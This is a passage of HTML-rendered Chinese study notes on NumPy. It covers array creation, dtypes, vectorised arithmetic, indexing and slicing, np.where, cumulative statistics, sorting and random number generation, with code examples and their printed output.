class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 快速创建多维数组</span></span><br><span class="line"><span class="comment"># 一维</span></span><br><span class="line">arr1 = np.zeros(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(arr1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二维</span></span><br><span class="line">arr2 = np.zeros((<span class="number">3</span>,<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(arr2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三维</span></span><br><span class="line">arr3 = np.zeros((<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(arr3)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[<span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span>]</span><br><span class="line"></span><br><span class="line">[[<span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span>]</span><br><span class="line"> [<span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span>]</span><br><span class="line"> [<span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span>]]</span><br><span class="line"> </span><br><span class="line"> [[[<span class="number">0.</span> <span class="number">0.</span>]</span><br><span class="line">  [<span class="number">0.</span> <span class="number">0.</span>]</span><br><span class="line">  [<span class="number">0.</span> <span class="number">0.</span>]]</span><br><span class="line"> [[<span class="number">0.</span> <span class="number">0.</span>]</span><br><span class="line">  [<span class="number">0.</span> <span class="number">0.</span>]</span><br><span class="line">  [<span class="number">0.</span> <span class="number">0.</span>]]]</span><br></pre></td></tr></table></figure><h1 id="2-ndarray的数据类型"><a href="#2-ndarray的数据类型" class="headerlink" title="2.ndarray的数据类型"></a>2.ndarray的数据类型</h1><p>数据类型，即dtype，是一个特殊的对象，它包含了nadarray需要为某一种类型数据所申明的内存块信息。    </p><h2 id="设置dtype"><a href="#设置dtype" class="headerlink" title="设置dtype"></a>设置dtype</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ndarray的数据类型</span></span><br><span class="line"><span class="comment"># 设置dtype</span></span><br><span class="line">arr1 = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],dtype=np.float64)</span><br><span class="line">arr2 = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],dtype=np.int32)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr1.dtype)</span><br><span class="line"><span class="built_in">print</span>(arr2.dtype)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">float64</span><br><span class="line">int32</span><br></pre></td></tr></table></figure><h1 id="3-NumPy数组算术"><a href="#3-NumPy数组算术" class="headerlink" title="3.NumPy数组算术"></a>3.NumPy数组算术</h1><ul><li><p>数组之所以重要是因为它允许你进行批量操作而无需任何for循环</p></li><li><p>NumPy用户称这种特性为向量化</p></li><li><p>任何在两个等尺寸数组之间的算术操作都应用了逐元素操作的⽅式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([[<span class="number">1.</span>, <span class="number">2.</span>, <span class="number">3.</span>], [<span class="number">4.</span>, <span class="number">5.</span>, <span class="number">6.</span>]])</span><br><span class="line"><span class="built_in">print</span>(arr * arr)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[[ <span class="number">1.</span>  <span class="number">4.</span>  <span class="number">9.</span>]</span><br><span class="line"> [<span class="number">16.</span> <span class="number">25.</span> <span class="number">36.</span>]]</span><br></pre></td></tr></table></figure></li><li><p>带有标量计算的算术操作，会把计算参数传递给数组的每⼀个元素</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([[<span class="number">1.</span>, <span class="number">2.</span>, <span class="number">3.</span>], [<span class="number">4.</span>, <span class="number">5.</span>, <span class="number">6.</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>/arr)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[[<span class="number">1.</span>         <span class="number">0.5</span>        <span class="number">0.33333333</span>]</span><br><span class="line"> [<span class="number">0.25</span>       <span class="number">0.2</span>        <span class="number">0.16666667</span>]]</span><br></pre></td></tr></table></figure><ul><li>同尺⼨数组之间的比较，会产生一个布尔值数组，同位置元素一一比较。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arr2 = np.array([[<span class="number">0.</span>, <span class="number">4.</span>, <span class="number">1.</span>], [<span class="number">7.</span>, <span class="number">2.</span>, <span class="number">12.</span>]])</span><br><span class="line">arr = np.array([[<span class="number">1.</span>, <span class="number">2.</span>, <span class="number">3.</span>], [<span class="number">4.</span>, <span class="number">5.</span>, <span class="number">6.</span>]])</span><br><span class="line"><span class="built_in">print</span>(arr2 &gt; arr)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[[<span class="literal">False</span>  <span class="literal">True</span> <span class="literal">False</span>]</span><br><span class="line"> [ <span class="literal">True</span> <span class="literal">False</span>  <span class="literal">True</span>]]</span><br></pre></td></tr></table></figure><h1 id="4-基础索引和切片"><a href="#4-基础索引和切片" class="headerlink" title="4.基础索引和切片"></a>4.基础索引和切片</h1><ul><li>ndarray 和列表切⽚差不多</li></ul><p><strong>注意：ndarray切片不会复制数据，这意味着你对切片的数据修改会反应在数据上。</strong></p><ul><li>如果你还是想要⼀份数组切⽚的拷⻉⽽不是⼀份视图的话， 你就必须显式地复制这个数组：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">5</span>：<span class="number">8</span>].copy（）</span><br></pre></td></tr></table></figure><ul><li>⼆维数组的切⽚索引</li></ul><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220920151648235.png" alt="image-20220920151648235"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">data2 = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]])</span><br><span class="line"></span><br><span class="line">sl = data2[<span class="number">2</span>]</span><br><span class="line">sl2 = data2[<span class="number">2</span>:,:]</span><br><span class="line">sl3 = data2[<span class="number">2</span>,:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sl)</span><br><span class="line"><span class="built_in">print</span>(sl.shape)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sl2)</span><br><span class="line"><span class="built_in">print</span>(sl2.shape)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sl3)</span><br><span class="line"><span class="built_in">print</span>(sl3.shape)</span><br><span class="line"></span><br><span class="line">// </span><br><span class="line">[<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line">(<span class="number">3</span>,)</span><br><span class="line">[[<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]]</span><br><span class="line">(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line">[<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line">(<span class="number">3</span>,)</span><br></pre></td></tr></table></figure><ul><li><p>可以对多个布尔值条件进 ⾏联合，需要使⽤数学操作符如&amp;（and）和|（or），Python的关键字and和or对布尔值数组并没有⽤，请使 ⽤&amp;（and）和|（or）来代替。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([[<span class="number">90</span>,<span class="number">100</span>,<span class="number">101</span>],[<span class="number">101</span>,<span class="number">1000</span>,<span class="number">2000</span>]])</span><br><span class="line"><span class="built_in">print</span>(arr &gt; <span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr[arr &gt; <span class="number">100</span>]) <span class="comment">#一维</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">arr[arr &gt; <span class="number">100</span>] = <span class="number">200</span>  <span class="comment">#把大于100的全部改为200</span></span><br><span class="line"><span class="built_in">print</span>(arr)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[[<span class="literal">False</span> <span class="literal">False</span>  <span class="literal">True</span>]</span><br><span class="line"> [ <span class="literal">True</span>  <span class="literal">True</span>  <span class="literal">True</span>]]</span><br><span class="line">[ <span class="number">101</span>  <span class="number">101</span> <span class="number">1000</span> <span class="number">2000</span>]</span><br><span class="line">[[ <span class="number">90</span> <span class="number">100</span> <span class="number">200</span>]</span><br><span class="line"> [<span class="number">200</span> <span class="number">200</span> <span class="number">200</span>]]</span><br></pre></td></tr></table></figure></li></ul><h1 id="5-布尔索引"><a href="#5-布尔索引" class="headerlink" title="5.布尔索引"></a>5.布尔索引</h1><ul><li><p>np.random.randn(a,b) :⽣成⼀些随机正态分布的数据</p></li><li><p>在索引数组时可以传⼊布尔值数，抽取该列数据，True为真，False为假。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 布尔索引</span></span><br><span class="line">arr = np.random.randn(<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(arr[[<span class="literal">True</span>,<span class="literal">False</span>,<span class="literal">True</span>,<span class="literal">False</span>]])</span><br><span class="line"></span><br><span class="line">[[-<span class="number">1.14471212</span>  <span class="number">0.38019173</span>  <span class="number">1.50191196</span>]</span><br><span class="line"> [ <span class="number">1.33559583</span> -<span class="number">1.50975707</span>  <span class="number">0.12254638</span>]</span><br><span class="line"> [-<span class="number">0.36420985</span>  <span class="number">0.21114719</span>  <span class="number">2.01839862</span>]</span><br><span class="line"> [-<span class="number">0.5194105</span>   <span class="number">0.34458367</span> -<span class="number">0.96759451</span>]]</span><br><span class="line"></span><br><span class="line">[[-<span class="number">1.14471212</span>  <span class="number">0.38019173</span>  <span class="number">1.50191196</span>]</span><br><span class="line"> [-<span class="number">0.36420985</span>  <span class="number">0.21114719</span>  <span class="number">2.01839862</span>]]</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h1 id="6-神奇索引"><a href="#6-神奇索引" class="headerlink" title="6.神奇索引"></a>6.神奇索引</h1><p>总的来看，从⼀个numpy⼆维数组⾥⾯选元素，⼤致有下⾯的⼏种语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> data[<span class="number">1</span>] 选择第⼀个元素</span><br><span class="line"><span class="number">2.</span> data[<span class="number">1</span>,<span class="number">2</span>] 选择第⼀个元素⾥⾯的第⼆个元素</span><br><span class="line"><span class="number">3.</span> data[<span class="number">1</span>,<span class="number">2</span>:] 选择第⼀个元素，再选第⼆个元素后⾯的全部元素</span><br><span class="line"><span class="number">4.</span> data[[<span class="literal">True</span>,<span class="literal">False</span>,…]] Bool索引，选择<span class="literal">True</span>的所有元素组合</span><br><span class="line"><span class="number">5.</span> data[[<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,…]] 神奇索引，选择第i个元素的组合</span><br></pre></td></tr></table></figure><h1 id="7-使用数组进行面向数组编程"><a href="#7-使用数组进行面向数组编程" class="headerlink" title="7.使用数组进行面向数组编程"></a>7.使用数组进行面向数组编程</h1><h2 id="一元通用函数-np-fun-a"><a href="#一元通用函数-np-fun-a" class="headerlink" title="一元通用函数 np.fun(a)"></a>一元通用函数 np.fun(a)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">arr = np.array([<span class="number">1</span>,<span class="number">5</span>,<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr.mean())</span><br><span class="line"><span class="built_in">print</span>(arr.<span class="built_in">max</span>())</span><br><span class="line"><span class="built_in">print</span>(arr.<span class="built_in">min</span>())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a1 = np.array([<span class="number">1</span>,<span class="number">5</span>,<span class="number">4</span>])</span><br><span class="line">a2 = np.array([<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(np.sqrt(a1))</span><br><span class="line"><span class="built_in">print</span>(np.square(a2))</span><br><span class="line"><span class="built_in">print</span>(np.average(a2))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[<span class="number">1.</span>         <span class="number">2.23606798</span> <span class="number">2.</span>        ]</span><br><span class="line">[ <span class="number">4</span>  <span class="number">1</span> <span class="number">36</span>]</span><br><span class="line"><span class="number">3.0</span></span><br></pre></td></tr></table></figure><h2 id="二元通用函数-np-fun-a"><a href="#二元通用函数-np-fun-a" class="headerlink" title="二元通用函数 np.fun(a)"></a>二元通用函数 np.fun(a)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">x = np.random.randn(<span class="number">8</span>)</span><br><span class="line">y = np.random.randn(<span class="number">8</span>)</span><br><span class="line">np.maximum(x, y)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">numpy.maximum 逐个元素地将x和y中元素的最大值计算出来</span><br><span class="line">add、substract、multiply</span><br><span class="line">divide, floor_divide</span><br><span class="line">power</span><br><span class="line">maximum</span><br><span class="line">minimum</span><br><span class="line">mod 等等函数</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="使用数组进行面向数组编程"><a href="#使用数组进行面向数组编程" class="headerlink" title="使用数组进行面向数组编程"></a>使用数组进行面向数组编程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">书⾥⾯的例⼦meshgird函数，是接收两个⼀维数组，并根据两个数组的所有（x，y）对⽣成⼀个⼆维矩阵，返回的是⼀个元组</span><br><span class="line"></span><br><span class="line">例如，下⾯的的写法就是指 在⽹格上x值可以取 <span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>，y值可以取 <span class="number">4</span>、<span class="number">5</span>，⼀共有<span class="number">3</span> * <span class="number">2</span> = <span class="number">6</span> 个点，这<span class="number">6</span>个点构成了⽹格。</span><br><span class="line"></span><br><span class="line">x = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">y = np.array([<span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">xpos, ypos = np.meshgrid(x, y）</span><br></pre></td></tr></table></figure><h2 id="将条件逻辑作为数组操作"><a href="#将条件逻辑作为数组操作" class="headerlink" title="将条件逻辑作为数组操作"></a>将条件逻辑作为数组操作</h2><ul><li><p>np.where(cond, xarr, yarr)</p><p>numpy.where函数是三元表达式x if condition else y的向量化版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xarr = np.array([<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>])</span><br><span class="line">yarr = np.array([<span class="number">2.1</span>, <span class="number">2.2</span>, <span class="number">2.3</span>, <span class="number">2.4</span>, <span class="number">2.5</span>])</span><br><span class="line">cond = np.array([<span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">False</span>])</span><br><span class="line">result = np.where(cond, xarr, yarr) // <span class="literal">True</span>就是xarr</span><br><span class="line">array([ <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">2.5</span>])</span><br></pre></td></tr></table></figure></li><li><p>np.where的第⼆个和第三个参数并不需要是数组，它们可以是 标量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([</span><br><span class="line"> [-<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>],</span><br><span class="line"> [ <span class="number">2</span>, <span class="number">2</span>, -<span class="number">2</span>, <span class="number">2</span>],</span><br><span class="line"> [ <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, -<span class="number">2</span>],</span><br><span class="line"> [ <span class="number">2</span>, -<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(np.where(arr &gt; <span class="number">0</span>,<span class="number">3</span>,arr))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[[-<span class="number">2</span> -<span class="number">2</span> -<span class="number">2</span> -<span class="number">2</span>]</span><br><span class="line"> [ <span class="number">3</span>  <span class="number">3</span> -<span class="number">2</span>  <span class="number">3</span>]</span><br><span class="line"> [ <span class="number">3</span>  <span class="number">3</span>  <span class="number">3</span> -<span class="number">2</span>]</span><br><span class="line"> [ <span class="number">3</span> -<span class="number">2</span>  <span class="number">3</span>  <span class="number">3</span>]]</span><br></pre></td></tr></table></figure><ul><li>传递给np.where的数组既可以是同等⼤⼩的数组，也可以是标量 </li><li>这个同等⼤⼩以布尔数组为准。</li></ul></li></ul><h2 id="数学和统计方法"><a href="#数学和统计方法" class="headerlink" title="数学和统计方法"></a>数学和统计方法</h2><ul><li>许多关于计算整个数组统计值或关于轴向数据的数学函数，可以作为数组类型的⽅法被调⽤。            </li></ul><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20220922171102112.png" alt="image-20220922171102112"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">axis=<span class="number">0</span> 全班</span><br><span class="line"></span><br><span class="line">axis=<span class="number">1</span> 个人</span><br><span class="line"></span><br><span class="line"><span class="comment"># cumsum 计算累计和</span></span><br><span class="line">arr = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>])</span><br><span class="line"><span class="built_in">print</span>(arr.cumsum())</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">3</span>  <span class="number">6</span> <span class="number">10</span> <span class="number">15</span> <span class="number">21</span> <span class="number">28</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># cumprod 计算累计积</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维</span></span><br><span class="line">arr = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>])</span><br><span class="line"><span class="built_in">print</span>(arr.cumsum())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># 二维</span></span><br><span class="line">arr = np.array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]])</span><br><span class="line"><span class="built_in">print</span>(arr.cumsum(axis=<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">3</span>  <span class="number">6</span> <span class="number">10</span> <span class="number">15</span> <span class="number">21</span> <span class="number">28</span>]</span><br><span class="line"></span><br><span class="line">[[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>]</span><br><span class="line"> [ <span class="number">3</span>  <span class="number">5</span>  <span class="number">7</span>]</span><br><span class="line"> [ <span class="number">9</span> <span class="number">12</span> <span class="number">15</span>]]</span><br><span class="line"></span><br><span class="line">[[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">3</span>]</span><br><span class="line"> [ <span class="number">3</span>  <span class="number">7</span> <span class="number">12</span>]</span><br><span class="line"> [ <span class="number">6</span> <span class="number">13</span> <span class="number">21</span>]]</span><br></pre></td></tr></table></figure><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>NumPy数组可以使⽤sort⽅法按位置排序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([</span><br><span class="line"> [<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>],</span><br><span class="line"> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line">arr.sort(<span class="number">1</span>)</span><br><span class="line">[[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>],</span><br><span class="line"> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line">arr.sort(<span class="number">0</span>)</span><br><span class="line">[[<span class="number">1</span> <span class="number">3</span> <span class="number">1</span>]</span><br><span class="line"> [<span class="number">2</span> <span class="number">3</span> <span class="number">4</span>]</span><br></pre></td></tr></table></figure><h1 id="8-随机数和随机漫步"><a href="#8-随机数和随机漫步" class="headerlink" title="8.随机数和随机漫步"></a>8.随机数和随机漫步</h1><h2 id="伪随机数生成"><a href="#伪随机数生成" class="headerlink" title="伪随机数生成"></a>伪随机数生成</h2><ul><li>np.random.seed(1234) 传⼀个随机种子，即可每次生成同样随机数。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新洗牌</span></span><br><span class="line">arr = np.array([<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>])</span><br><span class="line">np.random.shuffle(arr)</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br><span class="line"></span><br><span class="line">shuffle是直接在原来的数组上进⾏操作，对原来的数组进⾏洗牌</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>numpy.random.randint(low, high=None, size=None, dtype=ʼlʼ)</p><ul><li><p>low:[int]要从分布中得出的最低(有符号)整数。但是，如果high = None，则它将作为样本中的 最⾼整数。</p></li><li><p> high:[int，可选]从分布中提取的最⼤(有符号)整数。 </p></li><li><p>size :[int或 int元组，可选]输出形状。如果给定的形状是例如(m，n，k)，则绘制m * n * k个 样本。默认值为⽆，在这种情况下，将返回单个值。</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回0-5之间的（不包括5），3*4*5的矩阵</span></span><br><span class="line">arr = np.random.randint(<span class="number">0</span>, <span class="number">5</span>, (<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>))</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br><span class="line"></span><br><span class="line">[[[<span class="number">4</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">2</span>]</span><br><span class="line"> [<span class="number">3</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span>]</span><br><span class="line"> [<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">3</span> <span class="number">1</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span>]]</span><br><span class="line"> </span><br><span class="line"> [[<span class="number">1</span> <span class="number">4</span> <span class="number">3</span> <span class="number">0</span> <span class="number">4</span>]</span><br><span class="line"> [<span class="number">4</span> <span class="number">0</span> <span class="number">1</span> <span class="number">3</span> <span class="number">1</span>]</span><br><span class="line"> [<span class="number">4</span> <span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">2</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">0</span> <span class="number">3</span> <span class="number">1</span> <span class="number">1</span>]]</span><br><span class="line"> </span><br><span class="line"> [[<span class="number">4</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">3</span>]</span><br><span class="line"> [<span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line"> [<span class="number">0</span> <span class="number">0</span> <span class="number">3</span> <span class="number">4</span> <span class="number">3</span>]</span><br><span 